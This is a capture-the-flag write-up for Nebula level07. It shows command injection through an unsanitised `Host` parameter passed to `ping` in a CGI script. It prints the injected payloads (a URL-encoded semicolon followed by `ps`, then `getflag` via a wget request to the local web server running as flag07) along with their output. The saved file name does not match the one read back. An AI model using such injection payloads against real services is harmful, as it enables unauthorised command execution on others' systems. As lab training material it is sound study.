# Level07

The vulnerable script runs `ping` with the parameter `Host` substituted in. We can try executing multiple commands by terminating the ping command early and checking the currently running command.

```bash
# note the %3B which is a url encoded ; to terminate the command early
level07@nebula:/home/flag07$ ./index.cgi Host='%3B ps -p $$ -o cmd'
CMD
sh -c ping -c 3 ; ps -p $$ -o cmd 2>&1
```

Above we can see that we have successfully injected a command into `index.cgi`, by terminating `ping` with a semi-colon and then running our own command. The problem is that `index.cgi` does not have setuid, so we'll still be running as `level07`. However, the `thttpd.conf` displays the following:

```bash
# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07

...

# Specifies what user to switch to after initialization when started as root.
user=flag07
```

A webserver is running as `flag07` which is serving the `/home/flag07/` directory. If we can make a request to `index.cgi` with the Host parameter set to `getflag`, we will execute it as the user `flag07`. The perfect tool for this is `wget`.

```
level07@nebula:/home/flag07$ wget 'http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag' -O /home/level07/flag.txt
level07@nebula:/home/flag07$ cat /home/level07/out
<html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
